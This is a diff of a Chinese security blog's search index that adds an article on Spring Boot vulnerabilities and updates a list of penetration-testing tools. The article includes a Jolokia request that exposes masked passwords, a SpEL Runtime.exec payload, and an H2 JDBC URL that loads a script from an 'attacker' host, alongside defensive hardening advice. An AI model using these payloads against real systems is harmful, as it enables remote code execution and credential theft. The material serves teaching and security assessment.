@@ -1,6 +1,198 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>spring-boot详解</title>
+    <url>/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<blockquote>
+<h1 id="一、Spring-Boot基础与安全机制"><a href="#一、Spring-Boot基础与安全机制" class="headerlink" title="一、Spring Boot基础与安全机制"></a><strong>一、Spring Boot基础与安全机制</strong></h1><h4 id="1-Spring-Boot定义"><a href="#1-Spring-Boot定义" class="headerlink" title="1. Spring Boot定义"></a>1. <strong>Spring Boot定义</strong></h4><ul>
+<li><strong>核心定位</strong>：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（<code>@EnableAutoConfiguration</code>）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。</li>
+<li><strong>关键特性</strong>：<ul>
+<li>无XML配置，通过<code>spring-boot-starter-*</code>依赖自动装配组件。</li>
+<li>Actuator模块提供生产环境监控端点（如<code>/env</code>、<code>/health</code>），默认暴露敏感信息。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-安全机制缺陷"><a href="#2-安全机制缺陷" class="headerlink" title="2. 安全机制缺陷"></a>2. <strong>安全机制缺陷</strong></h4><ul>
+<li><strong>默认暴露路由</strong>：Actuator端点未授权访问导致信息泄露。</li>
+<li><strong>配置不当</strong>：开发环境配置误用于生产环境（如Swagger、Actuator未关闭）。</li>
+<li><strong>依赖链风险</strong>：第三方库（如SnakeYAML、XStream）的反序列化漏洞被利用。</li>
+</ul>
+<span id="more"></span>
+
+<hr>
+<h3 id="二、Spring-Boot历史漏洞详解"><a href="#二、Spring-Boot历史漏洞详解" class="headerlink" title="二、Spring Boot历史漏洞详解"></a><strong>二、Spring Boot历史漏洞详解</strong></h3><h4 id="1-信息泄露类漏洞"><a href="#1-信息泄露类漏洞" class="headerlink" title="1. 信息泄露类漏洞"></a>1. <strong>信息泄露类漏洞</strong></h4><ul>
+<li><strong>敏感数据暴露</strong><ul>
+<li><p><strong>漏洞路径</strong>：<code>/env</code>、<code>/actuator/env</code> 泄露环境变量、数据库密码（部分脱敏字段可被绕过）16。</p>
+</li>
+<li><p><strong>脱敏绕过</strong>：通过Jolokia接口调用MBean获取星号（<code>******</code>）遮掩的密码明文：</p>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>, <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;getProperty&quot;</span>, <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;security.user.password&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>接口详情泄露</strong><ul>
+<li><strong>Swagger路由</strong>：<code>/v2/api-docs</code>、<code>/swagger-ui.html</code> 暴露API文档及参数。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-远程代码执行（RCE）漏洞"><a href="#2-远程代码执行（RCE）漏洞" class="headerlink" title="2. 远程代码执行（RCE）漏洞"></a>2. <strong>远程代码执行（RCE）漏洞</strong></h4><p>以下是12类核心RCE漏洞的对比与利用要点：</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>漏洞名称</strong></th>
+<th align="left"><strong>利用条件</strong></th>
+<th align="left"><strong>利用方法</strong></th>
+<th align="left"><strong>关键路径</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Whitelabel Error Page SpEL</strong></td>
+<td align="left">Spring Boot 1.1.0-1.3.0</td>
+<td align="left">注入SpEL表达式：<code>$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;</code></td>
+<td align="left">触发错误页面的参数（如<code>?id=</code>)</td>
+</tr>
+<tr>
+<td align="left"><strong>Spring Cloud SnakeYAML RCE</strong></td>
+<td align="left">依赖<code>spring-cloud-starter</code></td>
+<td align="left">设置<code>spring.cloud.bootstrap.location</code>指向恶意YAML文件</td>
+<td align="left"><code>/env</code> + <code>/refresh</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Eureka XStream反序列化</strong></td>
+<td align="left">使用Eureka服务发现</td>
+<td align="left">修改<code>eureka.client.serviceUrl.defaultZone</code>指向恶意XStream Payload</td>
+<td align="left"><code>/env</code> + <code>/refresh</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Jolokia Logback JNDI</strong></td>
+<td align="left">Jolokia端点开放 + Logback依赖</td>
+<td align="left">通过<code>ch.qos.logback.classic.jmx.JMXConfigurator</code>加载远程恶意XML</td>
+<td align="left"><code>/jolokia</code> + <code>POST</code>请求</td>
+</tr>
+<tr>
+<td align="left"><strong>H2 Database Console JNDI</strong></td>
+<td align="left">启用H2 Console（默认<code>/h2-console</code>）</td>
+<td align="left">利用JDBC URL触发JNDI注入：<code>jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3/;INIT=RUNSCRIPT FROM &#39;http://attacker/exp.sql&#39;</code></td>
+<td align="left"><code>/h2-console</code>登录后的JDBC执行点</td>
+</tr>
+<tr>
+<td align="left"><strong>MySQL JDBC反序列化</strong></td>
+<td align="left">使用MySQL驱动 + 可外连</td>
+<td align="left">劫持JDBC连接至恶意MySQL服务器，发送Gadget链</td>
+<td align="left">修改<code>spring.datasource.url</code>属性</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>💡 <strong>利用链共性</strong>：多数RCE依赖Actuator的<code>/env</code>端点修改环境变量，并通过<code>/refresh</code>或<code>/restart</code>触发配置生效。</p>
+</blockquote>
+<hr>
+<h3 id="三、黑盒安全评估检查清单"><a href="#三、黑盒安全评估检查清单" class="headerlink" title="三、黑盒安全评估检查清单"></a><strong>三、黑盒安全评估检查清单</strong></h3><h4 id="1-路由探测与版本识别"><a href="#1-路由探测与版本识别" class="headerlink" title="1. 路由探测与版本识别"></a>1. <strong>路由探测与版本识别</strong></h4><ul>
+<li><strong>默认路由扫描</strong>：<ul>
+<li>Actuator 1.x根路径：<code>/env</code>、<code>/heapdump</code>。</li>
+<li>Actuator 2.x根路径：<code>/actuator/env</code>、<code>/actuator/heapdump</code>。</li>
+<li>自定义路径：尝试<code>/manage</code>、<code>/appenv</code>等常见替代路径。</li>
+</ul>
+</li>
+<li><strong>版本依赖关系</strong>：<br><strong>Spring Cloud与Boot版本兼容表</strong>：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">Spring Cloud</th>
+<th align="left">Spring Boot</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Edgware</td>
+<td align="left">1.5.x (不兼容2.x)</td>
+</tr>
+<tr>
+<td align="left">Finchley</td>
+<td align="left">2.0.x</td>
+</tr>
+<tr>
+<td align="left">Hoxton</td>
+<td align="left">2.2.x-2.3.x</td>
+</tr>
+</tbody></table>
+<h4 id="2-敏感端点检测"><a href="#2-敏感端点检测" class="headerlink" title="2. 敏感端点检测"></a>2. <strong>敏感端点检测</strong></h4><ul>
+<li><strong>高风险端点</strong>：</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/env            # 环境变量与配置</span><br><span class="line">/jolokia/list   # 列出所有MBean</span><br><span class="line">/heapdump       # 下载堆内存快照（含敏感数据）</span><br><span class="line">/trace          # 查看HTTP请求记录（含Cookie）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>信息泄露验证</strong>：<br>检查<code>/v2/api-docs</code>是否返回API JSON结构；访问<code>/swagger-ui.html</code>确认接口详情。</li>
+</ul>
+<h4 id="3-漏洞利用验证流程"><a href="#3-漏洞利用验证流程" class="headerlink" title="3. 漏洞利用验证流程"></a>3. <strong>漏洞利用验证流程</strong></h4><ol>
+<li><strong>信息收集</strong>：<ul>
+<li>访问<code>/env</code>搜索<code>password</code>、<code>secret</code>等关键词。</li>
+<li>检查<code>******</code>字段，尝试Jolokia明文提取。</li>
+</ul>
+</li>
+<li><strong>RCE触发</strong>：<ul>
+<li>修改环境变量（如<code>spring.datasource.url</code>注入恶意JDBC）。</li>
+<li>调用<code>/refresh</code>或<code>/restart</code>生效配置。</li>
+</ul>
+</li>
+<li><strong>内存分析</strong>：<ul>
+<li>下载<code>/heapdump</code>，使用MAT工具分析内存中的密码明文。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="四、防御建议"><a href="#四、防御建议" class="headerlink" title="四、防御建议"></a><strong>四、防御建议</strong></h3><ol>
+<li><strong>端点管控</strong>：<ul>
+<li>生产环境关闭Actuator或通过<code>management.endpoints.web.exposure.include</code>限制暴露端点。</li>
+</ul>
+</li>
+<li><strong>依赖安全</strong>：<ul>
+<li>避免使用有漏洞的组件（如XStream &lt; 1.4.17、SnakeYAML &lt; 1.31）。</li>
+</ul>
+</li>
+<li><strong>配置加固</strong>：<ul>
+<li>重命名敏感端点路径（如<code>management.endpoints.web.path-mapping.env=internal-env</code>）。</li>
+<li>启用Spring Security对Actuator端点鉴权。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、学习资源"><a href="#五、学习资源" class="headerlink" title="五、学习资源"></a><strong>五、学习资源</strong></h3><ol>
+<li><p><strong>漏洞项目</strong>：</p>
+<ul>
+<li><a href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey&#x2F;SpringBootVulExploit</a>：含漏洞环境与PoC。</li>
+</ul>
+</li>
+<li><p><strong>深度分析</strong>：</p>
+<ul>
+<li><a href="https://cloud.tencent.cn/developer/article/2278104">Spring {Boot, Data, Security}历史漏洞研究</a>：漏洞原理与调试方法。</li>
+</ul>
+</li>
+<li><p><strong>实验环境</strong>：</p>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/spring/spring-boot-actuator">vulhub&#x2F;spring-boot-actuator</a></li>
+</ul>
+</li>
+<li><p><strong>推荐工具</strong>：</p>
+<ol>
+<li><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6></li>
+<li><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6></li>
+<li><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6></li>
+</ol>
+</li>
+</ol>
+<p>此框架覆盖了Spring Boot漏洞的核心场景，从原理到实践形成闭环，可作为渗透测试和安全加固的标准化参考。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Guid-v1参数</title>
     <url>/2025/06/05/Guid-v1%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="详解GUID：结构、版本与V1的安全隐患"><a href="#详解GUID：结构、版本与V1的安全隐患" class="headerlink" title="详解GUID：结构、版本与V1的安全隐患"></a>详解GUID：结构、版本与V1的安全隐患</h2><h3 id="什么是GUID？"><a href="#什么是GUID？" class="headerlink" title="什么是GUID？"></a>什么是GUID？</h3><p>GUID（全局唯一标识符）是一个128位（16字节）的唯一标识符，通常表示为32个十六进制字符（8-4-4-4-12格式）。它在分布式系统中广泛用于生成无需中央协调的唯一ID，例如数据库主键、COM对象标识等。</p>
@@ -624,12 +816,12 @@
   <entry>
     <title>渗透工具&amp;项目推荐</title>
     <url>/2025/04/23/%E9%A1%B9%E7%9B%AE&amp;%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/</url>
-    <content><![CDATA[<h1 id="GitHub项目："><a href="#GitHub项目：" class="headerlink" title="GitHub项目："></a>GitHub项目：</h1><p><strong>看目录查找，内容未制表</strong></p>
+    <content><![CDATA[<p><strong>看目录查找，内容未制表</strong></p>
 <span id="more"></span>
 
-<h3 id="内网："><a href="#内网：" class="headerlink" title="内网："></a>内网：</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件："><a href="#bp插件：" class="headerlink" title="bp插件："></a>bp插件：</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞："><a href="#探测漏洞：" class="headerlink" title="探测漏洞："></a>探测漏洞：</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a><a href="https://github.com/zan8in/afrog">afrog</a></h6><h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">nuclei</a></h6><h6 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a><a href="https://github.com/SleepingBag945/dddd">dddd</a></h6><h5 id="框架-服务漏洞"><a href="#框架-服务漏洞" class="headerlink" title="框架&amp;服务漏洞"></a>框架&amp;服务漏洞</h5><h6 id="nacos-p-8848"><a href="#nacos-p-8848" class="headerlink" title="nacos-p-8848"></a><a href="https://github.com/Pizz33/nacos_vul">nacos-p-8848</a></h6><h6 id="winrm-p-5985"><a href="#winrm-p-5985" class="headerlink" title="winrm-p-5985 "></a><a href="https://github.com/Hackplayers/evil-winrm/commits?author=OscarAkaElvis">winrm-p-5985 </a></h6><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><h5 id="存活检测"><a href="#存活检测" class="headerlink" title="存活检测"></a>存活检测</h5><h6 id="存活检测-httpx"><a href="#存活检测-httpx" class="headerlink" title="存活检测-httpx"></a><a href="https://github.com/projectdiscovery/httpx/commits?author=dogancanbakir">存活检测-httpx</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->
+<h1 id="GitHub项目"><a href="#GitHub项目" class="headerlink" title="GitHub项目"></a>GitHub项目</h1><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件"><a href="#bp插件" class="headerlink" title="bp插件"></a>bp插件</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a><a href="https://github.com/zan8in/afrog">afrog</a></h6><h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">nuclei</a></h6><h6 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a><a href="https://github.com/SleepingBag945/dddd">dddd</a></h6><h5 id="框架-服务漏洞"><a href="#框架-服务漏洞" class="headerlink" title="框架&amp;服务漏洞"></a>框架&amp;服务漏洞</h5><h6 id="nacos-p-8848"><a href="#nacos-p-8848" class="headerlink" title="nacos-p-8848"></a><a href="https://github.com/Pizz33/nacos_vul">nacos-p-8848</a></h6><h6 id="winrm-p-5985"><a href="#winrm-p-5985" class="headerlink" title="winrm-p-5985 "></a><a href="https://github.com/Hackplayers/evil-winrm/commits?author=OscarAkaElvis">winrm-p-5985 </a></h6><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><h5 id="存活检测"><a href="#存活检测" class="headerlink" title="存活检测"></a>存活检测</h5><h6 id="存活检测-httpx"><a href="#存活检测-httpx" class="headerlink" title="存活检测-httpx"></a><a href="https://github.com/projectdiscovery/httpx/commits?author=dogancanbakir">存活检测-httpx</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->
 
-<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6><h1 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h1><h5 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h5><h6 id="openvpn—统一网"><a href="#openvpn—统一网" class="headerlink" title="openvpn—统一网"></a>openvpn—统一网</h6><h6 id="SocksCap645—管理-强制代理"><a href="#SocksCap645—管理-强制代理" class="headerlink" title="SocksCap645—管理&amp;强制代理"></a>SocksCap645—管理&amp;强制代理</h6><h6 id="Proxifier—强制代理"><a href="#Proxifier—强制代理" class="headerlink" title="Proxifier—强制代理"></a>Proxifier—强制代理</h6><h6 id="Fiddler-Classic—强制代理【渗透工具】"><a href="#Fiddler-Classic—强制代理【渗透工具】" class="headerlink" title="Fiddler Classic—强制代理【渗透工具】"></a>Fiddler Classic—强制代理【渗透工具】</h6><h6 id="Charles—强制代理【渗透工具】"><a href="#Charles—强制代理【渗透工具】" class="headerlink" title="Charles—强制代理【渗透工具】"></a>Charles—强制代理【渗透工具】</h6>]]></content>
+<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6><h6 id="cf"><a href="#cf" class="headerlink" title="cf"></a><a href="https://github.com/teamssix/cf/releases">cf</a></h6><h1 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h1><h5 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h5><h6 id="openvpn—统一网"><a href="#openvpn—统一网" class="headerlink" title="openvpn—统一网"></a>openvpn—统一网</h6><h6 id="SocksCap645—管理-强制代理"><a href="#SocksCap645—管理-强制代理" class="headerlink" title="SocksCap645—管理&amp;强制代理"></a>SocksCap645—管理&amp;强制代理</h6><h6 id="Proxifier—强制代理"><a href="#Proxifier—强制代理" class="headerlink" title="Proxifier—强制代理"></a>Proxifier—强制代理</h6><h6 id="Fiddler-Classic—强制代理【渗透工具】"><a href="#Fiddler-Classic—强制代理【渗透工具】" class="headerlink" title="Fiddler Classic—强制代理【渗透工具】"></a>Fiddler Classic—强制代理【渗透工具】</h6><h6 id="Charles—强制代理【渗透工具】"><a href="#Charles—强制代理【渗透工具】" class="headerlink" title="Charles—强制代理【渗透工具】"></a>Charles—强制代理【渗透工具】</h6><h6 id="burpsuite—【专业渗透工具】"><a href="#burpsuite—【专业渗透工具】" class="headerlink" title="burpsuite—【专业渗透工具】"></a>burpsuite—【专业渗透工具】</h6><h1 id="框架工具推荐"><a href="#框架工具推荐" class="headerlink" title="框架工具推荐"></a>框架工具推荐</h1><h5 id="spring-boot框架"><a href="#spring-boot框架" class="headerlink" title="spring-boot框架"></a>spring-boot框架</h5><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6><h6 id="swagger-hack"><a href="#swagger-hack" class="headerlink" title="swagger-hack"></a><a href="https://github.com/jayus0821/swagger-hack">swagger-hack</a></h6><h5 id="thinkphp框架"><a href="#thinkphp框架" class="headerlink" title="thinkphp框架"></a>thinkphp框架</h5><h5 id="Weblogic框架"><a href="#Weblogic框架" class="headerlink" title="Weblogic框架"></a>Weblogic框架</h5><h5 id="nacos框架"><a href="#nacos框架" class="headerlink" title="nacos框架"></a>nacos框架</h5>]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
@@ -1203,8 +1395,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>Honeypot</tag>
         <tag>Cybersecurity</tag>
+        <tag>Honeypot</tag>
         <tag>Information Gathering</tag>
         <tag>Intrusion Detection</tag>
         <tag>Attack Analysis</tag>
